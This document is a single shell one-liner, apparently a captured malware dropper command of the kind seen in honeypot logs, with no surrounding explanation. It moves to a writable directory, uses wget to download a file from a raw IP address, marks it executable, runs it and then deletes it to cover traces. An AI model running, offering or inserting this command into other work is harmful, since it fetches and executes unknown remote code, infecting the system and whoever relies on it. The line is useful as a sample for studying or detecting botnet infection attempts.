cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.101.166.164/' '; chmod +x ' '; ./' '; rm -rf ' '
